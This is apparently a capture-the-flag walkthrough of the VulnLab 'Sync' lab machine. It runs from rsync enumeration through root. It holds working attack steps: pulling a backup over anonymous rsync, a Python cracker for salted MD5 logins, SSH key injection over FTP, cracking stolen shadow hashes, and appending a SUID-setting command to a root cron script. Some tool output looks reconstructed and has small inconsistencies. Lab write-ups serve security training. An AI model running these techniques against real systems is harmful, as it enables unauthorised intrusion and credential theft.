---
icon: elephant
cover: ../../.gitbook/assets/yumyum1.jpg
coverY: 404.19358893777496
---

# VL-SYNC

### Reconnaissance & Enumeration

#### Initial Port Scanning

First, we perform a comprehensive Nmap scan to identify all open services:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ sudo nmap -sS -sV -sC -p- -T4 10.10.113.50 blah blah 
```

**Expected Results:**

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.5
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 38:a3:50:22:36:86:89:4b:11:aa:2c:ea:9a:79:ff:40 (ECDSA)
|_  256 b9:1f:df:2a:71:ec:f9:f2:76:14:2b:84:7c:d7:a6:1d (ED25519)
80/tcp  open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Login
873/tcp open  rsync   (protocol version 31)
```

**Key Services Identified:**

* **FTP (21):** vsftpd 3.0.5 - File upload/download capability
* **SSH (22):** OpenSSH 8.9p1 - Secure shell access
* **HTTP (80):** Apache 2.4.52 - Web application (Login page)
* **Rsync (873):** Protocol version 31 - **HIGH PRIORITY TARGET** (often misconfigured)

#### Service-Specific Enumeration

**HTTP Enumeration:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ whatweb http://10.10.113.50
http://10.10.113.50 [200 OK] Apache[2.4.52], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.10.113.50], Title[Login]
```

Browse to the web application:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ firefox http://10.10.113.50 &
```

**Observation:** A login page is present, but we don't have credentials yet.

**FTP Anonymous Access Check:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ ftp 10.10.113.50
Connected to 10.10.113.50.
220 (vsFTPd 3.0.5)
Name (10.10.113.50:sn0x): anonymous
331 Please specify the password.
Password: 
530 Login incorrect.
ftp> quit
```

**Result:** Anonymous FTP access is disabled.

***

### Rsync Exploitation - Information Disclosure

#### Understanding Rsync

**What is Rsync?**

Rsync is a file synchronization and transfer protocol commonly used for backups. It operates on port 873 and can be configured to allow:

* Anonymous access to shares (misconfiguration)
* File retrieval without authentication
* Remote file synchronization

**Why is it Dangerous?**

When misconfigured, Rsync can expose:

* Backup files containing sensitive data
* Configuration files with credentials
* Source code revealing application logic
* Database files

#### Rsync Enumeration

**List available modules (shares):**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ rsync 10.10.113.50::
httpd           web backup
```

**Critical Finding:** An `httpd` module is publicly accessible, described as "web backup".

**Explanation:**

* The `::` syntax lists available Rsync modules
* `httpd` suggests this contains web server files
* "web backup" indicates potentially sensitive application data

#### Data Exfiltration

**Create a directory for downloaded files:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ mkdir rsync
```

**Download the entire httpd module:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ rsync -av rsync://10.10.113.50/httpd rsync/
receiving incremental file list
./
db/
db/site.db
migrate/
www/
www/dashboard.php
www/index.php
www/logout.php

sent 123 bytes  received 16,850 bytes  11,315.33 bytes/sec
total size is 16,426  speedup is 0.97
```

**Parameters Explained:**

* `-a`: Archive mode (preserves permissions, timestamps)
* `-v`: Verbose output
* `rsync://10.10.113.50/httpd`: Source (Rsync module)
* `rsync/`: Local destination directory

**Examine the retrieved files:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ tree rsync/
rsync/
├── db
│   └── site.db
├── migrate
└── www
    ├── dashboard.php
    ├── index.php
    └── logout.php

3 directories, 4 files
```

#### Analyzing Sensitive Data

**Examine the SQLite database:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ file rsync/db/site.db
rsync/db/site.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 4, database pages 2, cookie 0x2, schema 4, UTF-8, version-valid-for 4
```

**Open the database:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ sqlite3 rsync/db/site.db
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> SELECT * FROM users;
1|triss|a0de4d7f81676c3ea9eabcadfd2536f6
2|jennifer|84ed611d9572fcbbc6ff03599d6335c5
sqlite> .quit
```

**Hashed Credentials Found:**

```
Username: triss
MD5 Hash: a0de4d7f816xxxxxxxxxxxxxxxxxxxxx

Username: jennifer
MD5 Hash: 84ed611xxxxxxxxxxxxxxxxxxxxxxxxxx
```

**Analyze the application source code:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ cat rsync/www/index.php
```

**Key Code Snippet:**

```php
<?php
session_start();

// Database connection
$db = new SQLite3('/opt/httpd/db/site.db');

// Security configuration
$secure = "6c4972f3717a5e881e282ad3105de01e";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // Hash generation
    $hash = md5("$secure|$username|$password");
    
    // Query database
    $stmt = $db->prepare('SELECT * FROM users WHERE username = :username AND password = :hash');
    $stmt->bindValue(':username', $username);
    $stmt->bindValue(':hash', $hash);
    $result = $stmt->execute();
    
    if ($user = $result->fetchArray()) {
        $_SESSION['user'] = $username;
        header('Location: dashboard.php');
    } else {
        $error = "Invalid credentials";
    }
}
?>
```

**Critical Discovery:**

The hash is generated using the format: `MD5($secure|$username|$password)`

Where:

* `$secure = "6c4972f3717a5e881e282ad3105de01e"` (static salt)
* `$username = user-provided username`
* `$password = user-provided password`

**Why This is Vulnerable:**

1. **Static Salt:** The same salt is used for all users
2. **Weak Hashing:** MD5 is cryptographically broken
3. **Predictable Format:** We know the exact hash structure
4. **Username Enumeration:** We have valid usernames from the database

This allows us to perform offline brute-force attacks efficiently.

***

### Password Cracking

#### Hash Cracking Strategy

**Create files for the attack:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ echo "a0de4dxxxxxxxxxxxxxxxxxxx" > hashes.txt

┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ echo "84ed6xxxxxxxxxxxxxxxxxxxxxxxx" >> hashes.txt

┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ echo "triss" > users.txt

┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ echo "jennifer" >> users.txt
```

#### Custom Hash Cracker

**Create the Python cracking script:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ nano cracker.py
```

**Script Content:**

```python
import argparse
import hashlib

def crack_hashes(hashes_file, users_file, passwords_file, secure):
    """
    Crack custom MD5 hashes in format: MD5($secure|$username|$password)
    """
    # Load target hashes
    with open(hashes_file, "r") as f:
        hashes = [line.strip() for line in f]

    # Load usernames
    with open(users_file, "r") as f:
        users = [line.strip() for line in f]

    # Load password wordlist
    with open(passwords_file, "r", encoding="latin-1") as f:
        passwords = [line.strip() for line in f]

    print(f"[*] Loaded {len(hashes)} hashes")
    print(f"[*] Loaded {len(users)} usernames")
    print(f"[*] Loaded {len(passwords)} passwords")
    print(f"[*] Secure string: {secure}\n")

    # Brute force attack
    for target_hash in hashes:
        hash_found = False
        for user in users:
            for password in passwords:
                # Generate hash in same format as application
                to_hash = f"{secure}|{user}|{password}"
                test_hash = hashlib.md5(to_hash.encode()).hexdigest()

                if test_hash == target_hash:
                    print(f"[FOUND] {target_hash}: {user}|{password}")
                    hash_found = True
                    break
            if hash_found:
                break
        
        if not hash_found:
            print(f"[FAILED] {target_hash}: No match found")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Hash Cracker for MD5($secure|$username|$password)"
    )
    parser.add_argument("hashes_file", help="File containing target MD5 hashes")
    parser.add_argument("users_file", help="File containing usernames")
    parser.add_argument("passwords_file", help="Wordlist for passwords")
    parser.add_argument("secure", help="Static secure string (salt)")

    args = parser.parse_args()

    crack_hashes(args.hashes_file, args.users_file, args.passwords_file, args.secure)
```

**Make the script executable:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ chmod +x cracker.py
```

#### Execute the Cracking Attack

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ python3 cracker.py hashes.txt users.txt /usr/share/wordlists/rockyou.txt 6c4972f3717a5e881e282ad3105de01e
[*] Loaded 2 hashes
[*] Loaded 2 usernames
[*] Loaded 14344391 passwords
[*] Secure string: 6c4972f3717a5e881e282ad3105de01e

[FOUND] a0de4d7f81676c3ea9eabcadfd2536f6: triss|gerald
```

**Credentials Recovered:**

```
Username: triss
Password: gerald
```

**How the Attack Works:**

1. For each hash in `hashes.txt`
2. For each username in `users.txt`
3. For each password in `rockyou.txt`:
   * Construct string: `6c4972f3717a5e881e282ad3105de01e|triss|gerald`
   * Hash with MD5: `a0de4d7f81676c3ea9eabcadfd2536f6`
   * Compare with target hash
   * If match → password found!

**Verification:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ echo -n "6c4972f3717a5e881e282ad3105de01e|triss|gerald" | md5sum
a0de4d7f81676c3ea9eabcadfd2536f6  -
```

**Confirmed!**

***

### FTP Access & SSH Key Injection

#### FTP Authentication

**Connect to FTP with discovered credentials:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ ftp 10.10.113.50
Connected to 10.10.113.50.
220 (vsFTPd 3.0.5)
Name (10.10.113.50:sn0x): triss
331 Please specify the password.
Password: gerald
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42589|)
150 Here comes the directory listing.
drwx------    2 1003     1003         4096 Apr 19  2023 .ssh
226 Directory send OK.
ftp> 
```

**Success!** We have FTP access and notice a `.ssh` directory.

#### SSH Key Generation

**Generate a new SSH key pair:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ ssh-keygen -t ed25519 -f sync_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in sync_key
Your public key has been saved in sync_key.pub
The key fingerprint is:
SHA256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx sn0x@sn0x
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
+----[SHA256]-----+
```

**View the public key:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ cat sync_key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx sn0x@sn0x
```

#### SSH Key Injection via FTP

**Method 1: Using FTP Command Line**

```bash
ftp> cd .ssh
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||45123|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```

**Create authorized\_keys file locally:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ cp sync_key.pub authorized_keys
```

**Upload via FTP:**

```bash
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||40317|)
150 Ok to send data.
100% |***********************************|    96      650.41 KiB/s    00:00 ETA
226 Transfer complete.
96 bytes sent in 00:00 (2.08 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||42771|)
150 Here comes the directory listing.
-rw-r--r--    1 1003     1003           96 Dec 05 15:30 authorized_keys
226 Directory send OK.
ftp> quit
221 Goodbye.
```

**Using FileZilla (GUI)**

1. Open FileZilla
2. Connect to `10.10.113.50:21`
3. Username: `triss`, Password: `gerald`
4. Navigate to `.ssh/` directory
5. Right-click → Create new file → `authorized_keys`
6. Right-click → Edit → Paste public key → Save
7. Set permissions to `600`

#### SSH Access

**Connect using the private key:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ chmod 600 sync_key

┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ ssh -i sync_key triss@10.10.113.50
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-1033-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Dec  5 15:35:22 UTC 2024

  System load:  0.0               Processes:             100
  Usage of /:   66.2% of 7.57GB   Users logged in:       0
  Memory usage: 22%               IPv4 address for eth0: 10.10.113.50
  Swap usage:   0%

Last login: Thu Dec  5 15:30:15 2024 from 10.10.14.23
triss@ip-10-10-200-238:~$
```

**Initial Access Achieved!**

**Stabilize and enumerate:**

```bash
triss@ip-10-10-200-238:~$ id
uid=1003(triss) gid=1003(triss) groups=1003(triss)

triss@ip-10-10-200-238:~$ whoami
triss

triss@ip-10-10-200-238:~$ pwd
/home/triss
```

***

### Privilege Escalation - Backup Script Exploitation

#### System Enumeration

**Check user privileges:**

```bash
triss@ip-10-10-200-238:~$ sudo -l
[sudo] password for triss: 
Sorry, user triss may not run sudo on ip-10-10-200-238.
```

**List other users:**

```bash
triss@ip-10-10-200-238:~$ cat /etc/passwd | grep -E "/bin/bash|/bin/sh"
root:x:0:0:root:/root:/bin/bash
sa:x:1001:1001:,,,:/home/sa:/bin/bash
jennifer:x:1002:1002:,,,:/home/jennifer:/bin/bash
triss:x:1003:1003:,,,:/home/triss:/bin/bash
```

**Users Found:**

* `root` (UID 0)
* `sa` (UID 1001)
* `jennifer` (UID 1002)
* `triss` (UID 1003) - our current user

**Search for interesting files:**

```bash
triss@ip-10-10-200-238:~$ find / -type f -name "*.sh" 2>/dev/null | grep -v proc
/usr/local/bin/backup.sh
/usr/lib/networkd-dispatcher/routable.d/50-ifup-hooks.sh
...
```

**Interesting Finding:** `/usr/local/bin/backup.sh`

#### Backup Script Analysis

**Examine the script:**

```bash
triss@ip-10-10-200-238:~$ ls -la /usr/local/bin/backup.sh
-rwxr-xr-x 1 sa sa 211 Apr 19  2023 /usr/local/bin/backup.sh
```

**Observations:**

* **Owner:** `sa` user (UID 1001)
* **Permissions:** `-rwxr-xr-x` (world-readable, executable)
* **We cannot modify it** (owned by sa, not writable by others)

**Read the script:**

```bash
triss@ip-10-10-200-238:~$ cat /usr/local/bin/backup.sh
#!/bin/bash

mkdir -p /tmp/backup
cp -r /opt/httpd /tmp/backup
cp /etc/passwd /tmp/backup
cp /etc/shadow /tmp/backup
cp /etc/rsyncd.conf /tmp/backup
zip -r /backup/$(date +%s).zip /tmp/backup
rm -rf /tmp/backup
```

**Script Breakdown:**

1. Creates `/tmp/backup` directory
2. Copies sensitive files:
   * `/opt/httpd` - Web application directory
   * `/etc/passwd` - User account information
   * `/etc/shadow` - **Password hashes** (normally requires root to read)
   * `/etc/rsyncd.conf` - Rsync configuration
3. Creates a ZIP archive in `/backup/` with Unix timestamp as filename
4. Removes temporary backup directory

**Critical Insight:**

The script copies `/etc/shadow`, which means:

* It must be **running as root** (only root can read `/etc/shadow`)
* Likely executed via **cron job** or similar automation
* Output directory `/backup/` might be accessible

**Check the backup directory:**

```bash
triss@ip-10-10-200-238:~$ ls -la /backup/
total 32
drwxr-xr-x  2 root root 4096 Dec  5 15:40 .
drwxr-xr-x 19 root root 4096 Apr 19  2023 ..
-rw-r--r--  1 root root 5847 Dec  5 15:35 1733408125.zip
-rw-r--r--  1 root root 5847 Dec  5 15:40 1733408421.zip
```

**Perfect!** Backup files are world-readable.

#### Extracting Sensitive Information

**Copy a backup file to our home directory:**

```bash
triss@ip-10-10-200-238:~$ cp /backup/1733408421.zip .

triss@ip-10-10-200-238:~$ ls -la 1733408421.zip
-rw-r--r-- 1 triss triss 5847 Dec  5 15:42 1733408421.zip
```

**Extract the archive:**

```bash
triss@ip-10-10-200-238:~$ unzip 1733408421.zip
Archive:  1733408421.zip
   creating: tmp/backup/
  inflating: tmp/backup/rsyncd.conf  
   creating: tmp/backup/httpd/
   creating: tmp/backup/httpd/www/
  inflating: tmp/backup/httpd/www/dashboard.php  
  inflating: tmp/backup/httpd/www/logout.php  
  inflating: tmp/backup/httpd/www/index.php  
   creating: tmp/backup/httpd/migrate/
   creating: tmp/backup/httpd/db/
  inflating: tmp/backup/httpd/db/site.db  
  inflating: tmp/backup/passwd       
  inflating: tmp/backup/shadow
```

**Examine the extracted files:**

```bash
triss@ip-10-10-200-238:~$ ls -la tmp/backup/
total 36
drwxr-xr-x 3 triss triss 4096 Dec  5 15:40 .
drwxrwxr-x 3 triss triss 4096 Dec  5 15:43 ..
drwxr-xr-x 4 triss triss 4096 Apr 19  2023 httpd
-rw-r--r-- 1 triss triss 1776 Dec  5 15:40 passwd
-rw-r--r-- 1 triss triss  225 Apr 19  2023 rsyncd.conf
-rw-r----- 1 triss triss 1232 Dec  5 15:40 shadow
```

**View the shadow file:**

```bash
triss@ip-10-10-200-238:~$ cat tmp/backup/shadow
root:$y$j9T$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:19471:0:99999:7:::
sa:$y$j9T$yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy:19471:0:99999:7:::
jennifer:$y$j9T$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz:19471:0:99999:7:::
triss:$y$j9T$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:19471:0:99999:7:::
```

**Perfect!** We have password hashes for all users.

#### Password Hash Cracking

**Download the files to our attacker machine:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ scp -i sync_key triss@10.10.113.50:/home/triss/tmp/backup/shadow .
shadow                                                        100% 1232    13.5KB/s   00:00

┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ scp -i sync_key triss@10.10.113.50:/home/triss/tmp/backup/passwd .
passwd                                                        100% 1776    19.4KB/s   00:00
```

**Combine passwd and shadow for John the Ripper:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ unshadow passwd shadow > unshadow.txt

┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ cat unshadow.txt
root:$y$j9T$xxx...:0:0:root:/root:/bin/bash
sa:$y$j9T$yyy...:1001:1001:,,,:/home/sa:/bin/bash
jennifer:$y$j9T$zzz...:1002:1002:,,,:/home/jennifer:/bin/bash
triss:$y$j9T$aaa...:1003:1003:,,,:/home/triss:/bin/bash
```

**Crack the passwords:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt unshadow.txt
Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 5 for all loaded hashes
Cost 2 (algorithm specific iterations) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
gerald           (triss)     
sakura           (sa)     
gerald           (jennifer)     
3g 0:00:00:45 DONE (2024-12-05 16:00) 0.06666g/s 156.0p/s 624.0c/s 624.0C/s winston..tagged
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Passwords Cracked:**

```
triss:gerald      (we already knew this)
jennifer:gerald   (same password!)
sa:sakura         (NEW!)
```

**Display all cracked passwords:**

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/SYNC]
└─$ john --show unshadow.txt
triss:gerald:1003:1003:,,,:/home/triss:/bin/bash
jennifer:gerald:1002:1002:,,,:/home/jennifer:/bin/bash
sa:sakura:1001:1001:,,,:/home/sa:/bin/bash

3 password hashes cracked, 1 left
```

***

### Lateral Movement

#### Access Jennifer Account

**Switch to jennifer user:**

```bash
triss@ip-10-10-200-238:~$ su jennifer
Password: gerald
jennifer@ip-10-10-200-238:/home/triss$
```

**Navigate to jennifer's home:**

```bash
jennifer@ip-10-10-200-238:/home/triss$ cd ~

jennifer@ip-10-10-200-238:~$ ls -la
total 32
drwx------ 3 jennifer jennifer 4096 Apr 19  2023 .
drwxr-xr-x 5 root     root     4096 Apr 19  2023 ..
-rw------- 1 jennifer jennifer    0 Apr 19  2023 .bash_history
-rw-r--r-- 1 jennifer jennifer  220 Apr 19  2023 .bash_logout
-rw-r--r-- 1 jennifer jennifer 3526 Apr 19  2023 .bashrc
drwx------ 2 jennifer jennifer 4096 Apr 19  2023 .ssh
-rw-r--r-- 1 jennifer jennifer   36 Apr 19  2023 user.txt
```

***

### Root Privilege Escalation via Script Manipulation

#### Access SA Account

**Switch to sa user:**

```bash
jennifer@ip-10-10-200-238:~$ su sa
Password: sakura
sa@ip-10-10-200-238:/home/jennifer$
```

**Why is SA Important?**

Remember: The backup script `/usr/local/bin/backup.sh` is **owned by sa** and has **write permissions for the owner**.

```bash
sa@ip-10-10-200-238:~$ ls -la /usr/local/bin/backup.sh
-rwxr-xr-x 1 sa sa 211 Apr 19  2023 /usr/local/bin/backup.sh
```

This means **sa can modify the script**!

#### Backup Script Manipulation

**Understanding the Attack:**

1. The script runs as **root** (proven by its ability to read `/etc/shadow`)
2. **sa** owns the script and can modify it
3. We can inject malicious commands that will execute as **root**

**Strategy:** Add a command to set the SUID bit on `/bin/bash`, giving us a root shell.

**Append malicious command:**

```bash
sa@ip-10-10-200-238:~$ echo "chmod ug+s /bin/bash" >> /usr/local/bin/backup.sh
```

**Verify the modification:**

```bash
sa@ip-10-10-200-238:~$ cat /usr/local/bin/backup.sh
#!/bin/bash

mkdir -p /tmp/backup
cp -r /opt/httpd /tmp/backup
cp /etc/passwd /tmp/backup
cp /etc/shadow /tmp/backup
cp /etc/rsyncd.conf /tmp/backup
zip -r /backup/$(date +%s).zip /tmp/backup
rm -rf /tmp/backup
chmod ug+s /bin/bash
```

**What This Does:**

* `chmod ug+s /bin/bash`:
  * `u+s`: Set User ID bit (SUID)
  * `g+s`: Set Group ID bit (SGID)
  * When executed, `/bin/bash` will run with the owner's (root) privileges

#### Waiting for Script Execution

The script is likely executed by a cron job. We need to wait for it to run.

**Monitor the bash binary:**

```bash
sa@ip-10-10-200-238:~$ watch -n 5 'ls -la /bin/bash'
```

**Or manually check:**

```bash
sa@ip-10-10-200-238:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

**After approximately 1-5 minutes:**

```bash
sa@ip-10-10-200-238:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

**Success!** Notice the `s` in permissions: `-rwsr-sr-x`

#### Root Shell Execution

**Execute bash with preserved privileges:**

```bash
sa@ip-10-10-200-238:~$ /bin/bash -p
bash-5.1# whoami
root
```

**Explanation of `-p` flag:**

* Without `-p`: Bash drops SUID privileges
* With `-p`: Bash preserves the effective user ID (root)

**Verify root access:**

```bash
bash-5.1# id
uid=1001(sa) gid=1001(sa) euid=0(root) egid=0(root) groups=0(root),1001(sa)
```

**Key Details:**

* `uid=1001(sa)`: Real user ID (still sa)
* `euid=0(root)`: **Effective user ID** (ROOT!)
* This means we have full root privileges

```bash
bash-5.1# cd /root

bash-5.1# ls -la
total 36
drwx------  4 root root 4096 Apr 19  2023 .
drwxr-xr-x 19 root root 4096 Apr 19  2023 ..
-rw-------  1 root root    0 Apr 19  2023 .bash_history
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
-rw-------  1 root root   20 Apr 19  2023 .lesshst
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   36 Apr 19  2023 root.txt
drwx------  2 root root 4096 Apr 19  2023 .ssh
drwx------  3 root root 4096 Apr 19  2023 snap

bash-5.1# cat root.txt
```

***

### Attack Flow

```
1. Nmap Scan
   ↓
2. Rsync Enumeration (port 873)
   ↓
3. Unauthenticated File Download (httpd module)
   ↓
4. Database Extraction (site.db)
   ↓
5. Source Code Analysis (index.php)
   ↓
6. Hash Format Discovery (MD5($secure|$user|$pass))
   ↓
7. Custom Hash Cracker (Python script)
   ↓
8. Password Cracking (triss:gerald)
   ↓
9. FTP Access (credential reuse)
   ↓
10. SSH Key Injection (authorized_keys)
    ↓
11. SSH Access (triss account)
    ↓
12. Backup Script Discovery (/usr/local/bin/backup.sh)
    ↓
13. Backup File Extraction (/backup/*.zip)
    ↓
14. Shadow File Extraction (password hashes)
    ↓
15. John the Ripper Cracking (sa:sakura, jennifer:gerald)
    ↓
16. Lateral Movement (jennifer → sa)
    ↓
17. Script Modification (inject SUID command)
    ↓
18. Wait for Cron Execution (automated script run)
    ↓
19. SUID Binary Exploitation (/bin/bash -p)
    ↓
20. Root Shell Access
```

***
